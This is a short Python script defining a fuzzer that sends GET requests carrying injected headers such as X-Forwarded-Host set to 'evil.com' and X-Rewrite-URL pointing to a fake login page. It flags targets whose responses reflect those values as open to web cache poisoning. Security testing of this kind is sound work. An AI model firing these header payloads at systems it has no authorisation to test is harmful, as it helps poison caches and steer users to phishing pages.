import requests

class WebCachePoisoningFuzzer:
    def __init__(self):
        self.name = "Web Cache Poisoning Fuzzer"
        self.payloads = [
            {"X-Forwarded-Host": "evil.com"},
            {"X-Original-URL": "/malicious.html"},
            {"X-Rewrite-URL": "/fake-login.html"},
            {"X-Forwarded-Scheme": "http"},
            {"X-Host": "evil.net"}
        ]
        self.signatures = ["evil.com", "malicious.html", "fake-login", "phish", "redirected"]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for headers in self.payloads:
                status, body = self.send_request(target, headers)
                is_vulnerable = self.analyze(body)
                results[f"{target} | {list(headers.keys())[0]}"] = {
                    "status": status,
                    "vulnerable": is_vulnerable
                }
        return results

    def send_request(self, url, headers):
        try:
            response = requests.get(url, headers=headers, timeout=5)
            return response.status_code, response.text[:1000]
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze(self, text):
        for sig in self.signatures:
            if sig.lower() in text.lower():
                return True
        return False
